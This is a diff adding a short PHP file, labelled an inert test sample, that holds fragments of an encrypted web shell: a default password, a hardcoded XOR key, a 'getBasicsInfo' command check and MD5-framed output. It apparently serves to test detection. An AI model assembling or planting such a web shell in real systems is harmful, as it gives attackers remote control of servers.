@@ -1,0 +1,6 @@
+// INERT TEST SAMPLE
+$pass='pass'; $payloadName='payload'; $key='3c6e0b8a9c15224a';
+if (strpos($data,"getBasicsInfo")!==false) { $_SESSION[$payloadName]=1; }
+$D[$i] = $D[$i]^$K[$i+1&15];
+echo substr(md5($P.$T),0,16); echo substr(md5($P.$T),16);
+
